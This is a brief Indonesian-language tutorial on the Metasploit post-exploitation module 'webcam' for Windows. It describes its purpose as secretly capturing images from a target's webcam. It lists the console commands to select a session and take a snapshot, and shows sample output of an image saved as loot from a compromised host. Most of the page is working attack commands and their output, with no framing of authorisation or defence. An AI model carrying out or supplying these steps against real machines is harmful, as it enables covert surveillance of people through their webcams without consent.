# webcam

Modul `webcam` di Metasploit adalah modul `post-exploitation` untuk sistem Windows yang digunakan untuk mengakses dan mengambil gambar dari webcam komputer target secara diam-diam.

## Cara Penggunaan di Metasploit

```
use post/windows/manage/webcam
set INDEX <ID>
set QUALITY 100
set SESSION <ID>
set VERBOSE 1
snapshot
```

Hasil output-nya seperti ini:

```
[*] 192.168.1.52 - Starting...
[*] 192.168.1.52 - Got frame
[+] 192.168.1.52 - Snapshot saved: /root/.msf4/loot/20250517001711_default_192.168.1.52_192.168.1.52.web_394465.jpg
[*] 192.168.1.52 - Stopped
[*] Post module execution completed
```
